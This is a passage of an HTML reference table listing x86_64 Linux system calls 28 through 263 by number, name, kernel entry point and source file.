align="center">28</td><td align="center">madvise</td><td align="center">sys_madvise</td><td align="center">mm&#x2F;madvise.c</td></tr><tr><td align="center">29</td><td align="center">shmget</td><td align="center">sys_shmget</td><td align="center">ipc&#x2F;shm.c</td></tr><tr><td align="center">30</td><td align="center">shmat</td><td align="center">sys_shmat</td><td align="center">ipc&#x2F;shm.c</td></tr><tr><td align="center">31</td><td align="center">shmctl</td><td align="center">sys_shmctl</td><td align="center">ipc&#x2F;shm.c</td></tr><tr><td align="center">32</td><td align="center">dup</td><td align="center">sys_dup</td><td align="center">fs&#x2F;file.c</td></tr><tr><td align="center">33</td><td align="center">dup2</td><td align="center">sys_dup2</td><td align="center">fs&#x2F;file.c</td></tr><tr><td align="center">34</td><td align="center">pause</td><td align="center">sys_pause</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">35</td><td align="center">nanosleep</td><td align="center">sys_nanosleep</td><td align="center">kernel&#x2F;hrtimer.c</td></tr><tr><td align="center">36</td><td align="center">getitimer</td><td align="center">sys_getitimer</td><td align="center">kernel&#x2F;itimer.c</td></tr><tr><td align="center">37</td><td align="center">alarm</td><td align="center">sys_alarm</td><td align="center">kernel&#x2F;timer.c</td></tr><tr><td align="center">38</td><td align="center">setitimer</td><td align="center">sys_setitimer</td><td align="center">kernel&#x2F;itimer.c</td></tr><tr><td align="center">39</td><td align="center">getpid</td><td align="center">sys_getpid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">40</td><td align="center">sendfile</td><td align="center">sys_sendfile64</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">41</td><td align="center">socket</td><td align="center">sys_socket</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">42</td><td align="center">connect</td><td align="center">sys_connect</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">43</td><td align="center">accept</td><td align="center">sys_accept</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">44</td><td align="center">sendto</td><td align="center">sys_sendto</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">45</td><td align="center">recvfrom</td><td align="center">sys_recvfrom</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">46</td><td align="center">sendmsg</td><td align="center">sys_sendmsg</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">47</td><td align="center">recvmsg</td><td align="center">sys_recvmsg</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">48</td><td align="center">shutdown</td><td align="center">sys_shutdown</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">49</td><td align="center">bind</td><td align="center">sys_bind</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">50</td><td align="center">listen</td><td align="center">sys_listen</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">51</td><td align="center">getsockname</td><td align="center">sys_getsockname</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">52</td><td align="center">getpeername</td><td align="center">sys_getpeername</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">53</td><td align="center">socketpair</td><td align="center">sys_socketpair</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">54</td><td align="center">setsockopt</td><td align="center">sys_setsockopt</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">55</td><td align="center">getsockopt</td><td align="center">sys_getsockopt</td><td align="center">net&#x2F;socket.c</td></tr><tr><td align="center">56</td><td align="center">clone</td><td align="center">stub_clone</td><td align="center">kernel&#x2F;fork.c</td></tr><tr><td align="center">57</td><td align="center">fork</td><td align="center">stub_fork</td><td align="center">kernel&#x2F;fork.c</td></tr><tr><td align="center">58</td><td align="center">vfork</td><td align="center">stub_vfork</td><td align="center">kernel&#x2F;fork.c</td></tr><tr><td align="center">59</td><td align="center">execve</td><td align="center">stub_execve</td><td align="center">fs&#x2F;exec.c</td></tr><tr><td align="center">60</td><td align="center">exit</td><td align="center">sys_exit</td><td align="center">kernel&#x2F;exit.c</td></tr><tr><td align="center">61</td><td align="center">wait4</td><td align="center">sys_wait4</td><td align="center">kernel&#x2F;exit.c</td></tr><tr><td align="center">62</td><td align="center">kill</td><td align="center">sys_kill</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">63</td><td align="center">uname</td><td align="center">sys_newuname</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">64</td><td align="center">semget</td><td align="center">sys_semget</td><td align="center">ipc&#x2F;sem.c</td></tr><tr><td align="center">65</td><td align="center">semop</td><td align="center">sys_semop</td><td align="center">ipc&#x2F;sem.c</td></tr><tr><td align="center">66</td><td align="center">semctl</td><td align="center">sys_semctl</td><td align="center">ipc&#x2F;sem.c</td></tr><tr><td align="center">67</td><td align="center">shmdt</td><td align="center">sys_shmdt</td><td align="center">ipc&#x2F;shm.c</td></tr><tr><td align="center">68</td><td align="center">msgget</td><td align="center">sys_msgget</td><td align="center">ipc&#x2F;msg.c</td></tr><tr><td align="center">69</td><td align="center">msgsnd</td><td align="center">sys_msgsnd</td><td align="center">ipc&#x2F;msg.c</td></tr><tr><td align="center">70</td><td align="center">msgrcv</td><td align="center">sys_msgrcv</td><td align="center">ipc&#x2F;msg.c</td></tr><tr><td align="center">71</td><td align="center">msgctl</td><td align="center">sys_msgctl</td><td align="center">ipc&#x2F;msg.c</td></tr><tr><td align="center">72</td><td align="center">fcntl</td><td align="center">sys_fcntl</td><td align="center">fs&#x2F;fcntl.c</td></tr><tr><td align="center">73</td><td align="center">flock</td><td align="center">sys_flock</td><td align="center">fs&#x2F;locks.c</td></tr><tr><td align="center">74</td><td align="center">fsync</td><td align="center">sys_fsync</td><td align="center">fs&#x2F;sync.c</td></tr><tr><td align="center">75</td><td align="center">fdatasync</td><td align="center">sys_fdatasync</td><td align="center">fs&#x2F;sync.c</td></tr><tr><td align="center">76</td><td align="center">truncate</td><td align="center">sys_truncate</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">77</td><td align="center">ftruncate</td><td align="center">sys_ftruncate</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">78</td><td align="center">getdents</td><td align="center">sys_getdents</td><td align="center">fs&#x2F;readdir.c</td></tr><tr><td align="center">79</td><td align="center">getcwd</td><td align="center">sys_getcwd</td><td align="center">fs&#x2F;dcache.c</td></tr><tr><td align="center">80</td><td align="center">chdir</td><td align="center">sys_chdir</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">81</td><td align="center">fchdir</td><td align="center">sys_fchdir</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">82</td><td align="center">rename</td><td align="center">sys_rename</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">83</td><td align="center">mkdir</td><td align="center">sys_mkdir</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">84</td><td align="center">rmdir</td><td align="center">sys_rmdir</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">85</td><td align="center">creat</td><td align="center">sys_creat</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">86</td><td align="center">link</td><td align="center">sys_link</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">87</td><td align="center">unlink</td><td align="center">sys_unlink</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">88</td><td align="center">symlink</td><td align="center">sys_symlink</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">89</td><td align="center">readlink</td><td align="center">sys_readlink</td><td align="center">fs&#x2F;stat.c</td></tr><tr><td align="center">90</td><td align="center">chmod</td><td align="center">sys_chmod</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">91</td><td align="center">fchmod</td><td align="center">sys_fchmod</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">92</td><td align="center">chown</td><td align="center">sys_chown</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">93</td><td align="center">fchown</td><td align="center">sys_fchown</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">94</td><td align="center">lchown</td><td align="center">sys_lchown</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">95</td><td align="center">umask</td><td align="center">sys_umask</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">96</td><td align="center">gettimeofday</td><td align="center">sys_gettimeofday</td><td align="center">kernel&#x2F;time.c</td></tr><tr><td align="center">97</td><td align="center">getrlimit</td><td align="center">sys_getrlimit</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">98</td><td align="center">getrusage</td><td align="center">sys_getrusage</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">99</td><td align="center">sysinfo</td><td align="center">sys_sysinfo</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">100</td><td align="center">times</td><td align="center">sys_times</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">101</td><td align="center">ptrace</td><td align="center">sys_ptrace</td><td align="center">kernel&#x2F;ptrace.c</td></tr><tr><td align="center">102</td><td align="center">getuid</td><td align="center">sys_getuid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">103</td><td align="center">syslog</td><td align="center">sys_syslog</td><td align="center">kernel&#x2F;printk&#x2F;printk.c</td></tr><tr><td align="center">104</td><td align="center">getgid</td><td align="center">sys_getgid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">105</td><td align="center">setuid</td><td align="center">sys_setuid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">106</td><td align="center">setgid</td><td align="center">sys_setgid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">107</td><td align="center">geteuid</td><td align="center">sys_geteuid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">108</td><td align="center">getegid</td><td align="center">sys_getegid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">109</td><td align="center">setpgid</td><td align="center">sys_setpgid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">110</td><td align="center">getppid</td><td align="center">sys_getppid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">111</td><td align="center">getpgrp</td><td align="center">sys_getpgrp</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">112</td><td align="center">setsid</td><td align="center">sys_setsid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">113</td><td align="center">setreuid</td><td align="center">sys_setreuid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">114</td><td align="center">setregid</td><td align="center">sys_setregid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">115</td><td align="center">getgroups</td><td align="center">sys_getgroups</td><td align="center">kernel&#x2F;groups.c</td></tr><tr><td align="center">116</td><td align="center">setgroups</td><td align="center">sys_setgroups</td><td align="center">kernel&#x2F;groups.c</td></tr><tr><td align="center">117</td><td align="center">setresuid</td><td align="center">sys_setresuid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">118</td><td align="center">getresuid</td><td align="center">sys_getresuid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">119</td><td align="center">setresgid</td><td align="center">sys_setresgid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">120</td><td align="center">getresgid</td><td align="center">sys_getresgid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">121</td><td align="center">getpgid</td><td align="center">sys_getpgid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">122</td><td align="center">setfsuid</td><td align="center">sys_setfsuid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">123</td><td align="center">setfsgid</td><td align="center">sys_setfsgid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">124</td><td align="center">getsid</td><td align="center">sys_getsid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">125</td><td align="center">capget</td><td align="center">sys_capget</td><td align="center">kernel&#x2F;capability.c</td></tr><tr><td align="center">126</td><td align="center">capset</td><td align="center">sys_capset</td><td align="center">kernel&#x2F;capability.c</td></tr><tr><td align="center">127</td><td align="center">rt_sigpending</td><td align="center">sys_rt_sigpending</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">128</td><td align="center">rt_sigtimedwait</td><td align="center">sys_rt_sigtimedwait</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">129</td><td align="center">rt_sigqueueinfo</td><td align="center">sys_rt_sigqueueinfo</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">130</td><td align="center">rt_sigsuspend</td><td align="center">sys_rt_sigsuspend</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">131</td><td align="center">sigaltstack</td><td align="center">sys_sigaltstack</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">132</td><td align="center">utime</td><td align="center">sys_utime</td><td align="center">fs&#x2F;utimes.c</td></tr><tr><td align="center">133</td><td align="center">mknod</td><td align="center">sys_mknod</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">134</td><td align="center">uselib</td><td align="center"></td><td align="center">fs&#x2F;exec.c</td></tr><tr><td align="center">135</td><td align="center">personality</td><td align="center">sys_personality</td><td align="center">kernel&#x2F;exec_domain.c</td></tr><tr><td align="center">136</td><td align="center">ustat</td><td align="center">sys_ustat</td><td align="center">fs&#x2F;statfs.c</td></tr><tr><td align="center">137</td><td align="center">statfs</td><td align="center">sys_statfs</td><td align="center">fs&#x2F;statfs.c</td></tr><tr><td align="center">138</td><td align="center">fstatfs</td><td align="center">sys_fstatfs</td><td align="center">fs&#x2F;statfs.c</td></tr><tr><td align="center">139</td><td align="center">sysfs</td><td align="center">sys_sysfs</td><td align="center">fs&#x2F;filesystems.c</td></tr><tr><td align="center">140</td><td align="center">getpriority</td><td align="center">sys_getpriority</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">141</td><td align="center">setpriority</td><td align="center">sys_setpriority</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">142</td><td align="center">sched_setparam</td><td align="center">sys_sched_setparam</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">143</td><td align="center">sched_getparam</td><td align="center">sys_sched_getparam</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">144</td><td align="center">sched_setscheduler</td><td align="center">sys_sched_setscheduler</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">145</td><td align="center">sched_getscheduler</td><td align="center">sys_sched_getscheduler</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">146</td><td align="center">sched_get_priority_max</td><td align="center">sys_sched_get_priority_max</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">147</td><td align="center">sched_get_priority_min</td><td align="center">sys_sched_get_priority_min</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">148</td><td align="center">sched_rr_get_interval</td><td align="center">sys_sched_rr_get_interval</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">149</td><td align="center">mlock</td><td align="center">sys_mlock</td><td align="center">mm&#x2F;mlock.c</td></tr><tr><td align="center">150</td><td align="center">munlock</td><td align="center">sys_munlock</td><td align="center">mm&#x2F;mlock.c</td></tr><tr><td align="center">151</td><td align="center">mlockall</td><td align="center">sys_mlockall</td><td align="center">mm&#x2F;mlock.c</td></tr><tr><td align="center">152</td><td align="center">munlockall</td><td align="center">sys_munlockall</td><td align="center">mm&#x2F;mlock.c</td></tr><tr><td align="center">153</td><td align="center">vhangup</td><td align="center">sys_vhangup</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">154</td><td align="center">modify_ldt</td><td align="center">sys_modify_ldt</td><td align="center">arch&#x2F;x86&#x2F;um&#x2F;ldt.c</td></tr><tr><td align="center">155</td><td align="center">pivot_root</td><td align="center">sys_pivot_root</td><td align="center">fs&#x2F;namespace.c</td></tr><tr><td align="center">156</td><td align="center">_sysctl</td><td align="center">sys_sysctl</td><td align="center">kernel&#x2F;sysctl_binary.c</td></tr><tr><td align="center">157</td><td align="center">prctl</td><td align="center">sys_prctl</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">158</td><td align="center">arch_prctl</td><td align="center">sys_arch_prctl</td><td align="center">arch&#x2F;x86&#x2F;um&#x2F;syscalls_64.c</td></tr><tr><td align="center">159</td><td align="center">adjtimex</td><td align="center">sys_adjtimex</td><td align="center">kernel&#x2F;time.c</td></tr><tr><td align="center">160</td><td align="center">setrlimit</td><td align="center">sys_setrlimit</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">161</td><td align="center">chroot</td><td align="center">sys_chroot</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">162</td><td align="center">sync</td><td align="center">sys_sync</td><td align="center">fs&#x2F;sync.c</td></tr><tr><td align="center">163</td><td align="center">acct</td><td align="center">sys_acct</td><td align="center">kernel&#x2F;acct.c</td></tr><tr><td align="center">164</td><td align="center">settimeofday</td><td align="center">sys_settimeofday</td><td align="center">kernel&#x2F;time.c</td></tr><tr><td align="center">165</td><td align="center">mount</td><td align="center">sys_mount</td><td align="center">fs&#x2F;namespace.c</td></tr><tr><td align="center">166</td><td align="center">umount2</td><td align="center">sys_umount</td><td align="center">fs&#x2F;namespace.c</td></tr><tr><td align="center">167</td><td align="center">swapon</td><td align="center">sys_swapon</td><td align="center">mm&#x2F;swapfile.c</td></tr><tr><td align="center">168</td><td align="center">swapoff</td><td align="center">sys_swapoff</td><td align="center">mm&#x2F;swapfile.c</td></tr><tr><td align="center">169</td><td align="center">reboot</td><td align="center">sys_reboot</td><td align="center">kernel&#x2F;reboot.c</td></tr><tr><td align="center">170</td><td align="center">sethostname</td><td align="center">sys_sethostname</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">171</td><td align="center">setdomainname</td><td align="center">sys_setdomainname</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">172</td><td align="center">iopl</td><td align="center">stub_iopl</td><td align="center">arch&#x2F;x86&#x2F;kernel&#x2F;ioport.c</td></tr><tr><td align="center">173</td><td align="center">ioperm</td><td align="center">sys_ioperm</td><td align="center">arch&#x2F;x86&#x2F;kernel&#x2F;ioport.c</td></tr><tr><td align="center">174</td><td align="center">create_module</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">175</td><td align="center">init_module</td><td align="center">sys_init_module</td><td align="center">kernel&#x2F;module.c</td></tr><tr><td align="center">176</td><td align="center">delete_module</td><td align="center">sys_delete_module</td><td align="center">kernel&#x2F;module.c</td></tr><tr><td align="center">177</td><td align="center">get_kernel_syms</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">178</td><td align="center">query_module</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">179</td><td align="center">quotactl</td><td align="center">sys_quotactl</td><td align="center">fs&#x2F;quota&#x2F;quota.c</td></tr><tr><td align="center">180</td><td align="center">nfsservctl</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">181</td><td align="center">getpmsg</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">182</td><td align="center">putpmsg</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">183</td><td align="center">afs_syscall</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">184</td><td align="center">tuxcall</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">185</td><td align="center">security</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">186</td><td align="center">gettid</td><td align="center">sys_gettid</td><td align="center">kernel&#x2F;sys.c</td></tr><tr><td align="center">187</td><td align="center">readahead</td><td align="center">sys_readahead</td><td align="center">mm&#x2F;readahead.c</td></tr><tr><td align="center">188</td><td align="center">setxattr</td><td align="center">sys_setxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">189</td><td align="center">lsetxattr</td><td align="center">sys_lsetxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">190</td><td align="center">fsetxattr</td><td align="center">sys_fsetxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">191</td><td align="center">getxattr</td><td align="center">sys_getxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">192</td><td align="center">lgetxattr</td><td align="center">sys_lgetxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">193</td><td align="center">fgetxattr</td><td align="center">sys_fgetxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">194</td><td align="center">listxattr</td><td align="center">sys_listxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">195</td><td align="center">llistxattr</td><td align="center">sys_llistxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">196</td><td align="center">flistxattr</td><td align="center">sys_flistxattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">197</td><td align="center">removexattr</td><td align="center">sys_removexattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">198</td><td align="center">lremovexattr</td><td align="center">sys_lremovexattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">199</td><td align="center">fremovexattr</td><td align="center">sys_fremovexattr</td><td align="center">fs&#x2F;xattr.c</td></tr><tr><td align="center">200</td><td align="center">tkill</td><td align="center">sys_tkill</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">201</td><td align="center">time</td><td align="center">sys_time</td><td align="center">kernel&#x2F;time.c</td></tr><tr><td align="center">202</td><td align="center">futex</td><td align="center">sys_futex</td><td align="center">kernel&#x2F;futex.c</td></tr><tr><td align="center">203</td><td align="center">sched_setaffinity</td><td align="center">sys_sched_setaffinity</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">204</td><td align="center">sched_getaffinity</td><td align="center">sys_sched_getaffinity</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">205</td><td align="center">set_thread_area</td><td align="center"></td><td align="center">arch&#x2F;x86&#x2F;kernel&#x2F;tls.c</td></tr><tr><td align="center">206</td><td align="center">io_setup</td><td align="center">sys_io_setup</td><td align="center">fs&#x2F;aio.c</td></tr><tr><td align="center">207</td><td align="center">io_destroy</td><td align="center">sys_io_destroy</td><td align="center">fs&#x2F;aio.c</td></tr><tr><td align="center">208</td><td align="center">io_getevents</td><td align="center">sys_io_getevents</td><td align="center">fs&#x2F;aio.c</td></tr><tr><td align="center">209</td><td align="center">io_submit</td><td align="center">sys_io_submit</td><td align="center">fs&#x2F;aio.c</td></tr><tr><td align="center">210</td><td align="center">io_cancel</td><td align="center">sys_io_cancel</td><td align="center">fs&#x2F;aio.c</td></tr><tr><td align="center">211</td><td align="center">get_thread_area</td><td align="center"></td><td align="center">arch&#x2F;x86&#x2F;kernel&#x2F;tls.c</td></tr><tr><td align="center">212</td><td align="center">lookup_dcookie</td><td align="center">sys_lookup_dcookie</td><td align="center">fs&#x2F;dcookies.c</td></tr><tr><td align="center">213</td><td align="center">epoll_create</td><td align="center">sys_epoll_create</td><td align="center">fs&#x2F;eventpoll.c</td></tr><tr><td align="center">214</td><td align="center">epoll_ctl_old</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">215</td><td align="center">epoll_wait_old</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">216</td><td align="center">remap_file_pages</td><td align="center">sys_remap_file_pages</td><td align="center">mm&#x2F;fremap.c</td></tr><tr><td align="center">217</td><td align="center">getdents64</td><td align="center">sys_getdents64</td><td align="center">fs&#x2F;readdir.c</td></tr><tr><td align="center">218</td><td align="center">set_tid_address</td><td align="center">sys_set_tid_address</td><td align="center">kernel&#x2F;fork.c</td></tr><tr><td align="center">219</td><td align="center">restart_syscall</td><td align="center">sys_restart_syscall</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">220</td><td align="center">semtimedop</td><td align="center">sys_semtimedop</td><td align="center">ipc&#x2F;sem.c</td></tr><tr><td align="center">221</td><td align="center">fadvise64</td><td align="center">sys_fadvise64</td><td align="center">mm&#x2F;fadvise.c</td></tr><tr><td align="center">222</td><td align="center">timer_create</td><td align="center">sys_timer_create</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">223</td><td align="center">timer_settime</td><td align="center">sys_timer_settime</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">224</td><td align="center">timer_gettime</td><td align="center">sys_timer_gettime</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">225</td><td align="center">timer_getoverrun</td><td align="center">sys_timer_getoverrun</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">226</td><td align="center">timer_delete</td><td align="center">sys_timer_delete</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">227</td><td align="center">clock_settime</td><td align="center">sys_clock_settime</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">228</td><td align="center">clock_gettime</td><td align="center">sys_clock_gettime</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">229</td><td align="center">clock_getres</td><td align="center">sys_clock_getres</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">230</td><td align="center">clock_nanosleep</td><td align="center">sys_clock_nanosleep</td><td align="center">kernel&#x2F;posix-timers.c</td></tr><tr><td align="center">231</td><td align="center">exit_group</td><td align="center">sys_exit_group</td><td align="center">kernel&#x2F;exit.c</td></tr><tr><td align="center">232</td><td align="center">epoll_wait</td><td align="center">sys_epoll_wait</td><td align="center">fs&#x2F;eventpoll.c</td></tr><tr><td align="center">233</td><td align="center">epoll_ctl</td><td align="center">sys_epoll_ctl</td><td align="center">fs&#x2F;eventpoll.c</td></tr><tr><td align="center">234</td><td align="center">tgkill</td><td align="center">sys_tgkill</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">235</td><td align="center">utimes</td><td align="center">sys_utimes</td><td align="center">fs&#x2F;utimes.c</td></tr><tr><td align="center">236</td><td align="center">vserver</td><td align="center"></td><td align="center">NOT</td></tr><tr><td align="center">237</td><td align="center">mbind</td><td align="center">sys_mbind</td><td align="center">mm&#x2F;mempolicy.c</td></tr><tr><td align="center">238</td><td align="center">set_mempolicy</td><td align="center">sys_set_mempolicy</td><td align="center">mm&#x2F;mempolicy.c</td></tr><tr><td align="center">239</td><td align="center">get_mempolicy</td><td align="center">sys_get_mempolicy</td><td align="center">mm&#x2F;mempolicy.c</td></tr><tr><td align="center">240</td><td align="center">mq_open</td><td align="center">sys_mq_open</td><td align="center">ipc&#x2F;mqueue.c</td></tr><tr><td align="center">241</td><td align="center">mq_unlink</td><td align="center">sys_mq_unlink</td><td align="center">ipc&#x2F;mqueue.c</td></tr><tr><td align="center">242</td><td align="center">mq_timedsend</td><td align="center">sys_mq_timedsend</td><td align="center">ipc&#x2F;mqueue.c</td></tr><tr><td align="center">243</td><td align="center">mq_timedreceive</td><td align="center">sys_mq_timedreceive</td><td align="center">ipc&#x2F;mqueue.c</td></tr><tr><td align="center">244</td><td align="center">mq_notify</td><td align="center">sys_mq_notify</td><td align="center">ipc&#x2F;mqueue.c</td></tr><tr><td align="center">245</td><td align="center">mq_getsetattr</td><td align="center">sys_mq_getsetattr</td><td align="center">ipc&#x2F;mqueue.c</td></tr><tr><td align="center">246</td><td align="center">kexec_load</td><td align="center">sys_kexec_load</td><td align="center">kernel&#x2F;kexec.c</td></tr><tr><td align="center">247</td><td align="center">waitid</td><td align="center">sys_waitid</td><td align="center">kernel&#x2F;exit.c</td></tr><tr><td align="center">248</td><td align="center">add_key</td><td align="center">sys_add_key</td><td align="center">security&#x2F;keys&#x2F;keyctl.c</td></tr><tr><td align="center">249</td><td align="center">request_key</td><td align="center">sys_request_key</td><td align="center">security&#x2F;keys&#x2F;keyctl.c</td></tr><tr><td align="center">250</td><td align="center">keyctl</td><td align="center">sys_keyctl</td><td align="center">security&#x2F;keys&#x2F;keyctl.c</td></tr><tr><td align="center">251</td><td align="center">ioprio_set</td><td align="center">sys_ioprio_set</td><td align="center">fs&#x2F;ioprio.c</td></tr><tr><td align="center">252</td><td align="center">ioprio_get</td><td align="center">sys_ioprio_get</td><td align="center">fs&#x2F;ioprio.c</td></tr><tr><td align="center">253</td><td align="center">inotify_init</td><td align="center">sys_inotify_init</td><td align="center">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c</td></tr><tr><td align="center">254</td><td align="center">inotify_add_watch</td><td align="center">sys_inotify_add_watch</td><td align="center">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c</td></tr><tr><td align="center">255</td><td align="center">inotify_rm_watch</td><td align="center">sys_inotify_rm_watch</td><td align="center">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c</td></tr><tr><td align="center">256</td><td align="center">migrate_pages</td><td align="center">sys_migrate_pages</td><td align="center">mm&#x2F;mempolicy.c</td></tr><tr><td align="center">257</td><td align="center">openat</td><td align="center">sys_openat</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">258</td><td align="center">mkdirat</td><td align="center">sys_mkdirat</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">259</td><td align="center">mknodat</td><td align="center">sys_mknodat</td><td align="center">fs&#x2F;namei.c</td></tr><tr><td align="center">260</td><td align="center">fchownat</td><td align="center">sys_fchownat</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">261</td><td align="center">futimesat</td><td align="center">sys_futimesat</td><td align="center">fs&#x2F;utimes.c</td></tr><tr><td align="center">262</td><td align="center">newfstatat</td><td align="center">sys_newfstatat</td><td align="center">fs&#x2F;stat.c</td></tr><tr><td align="center">263</td><td align="center">unlinkat</td><td 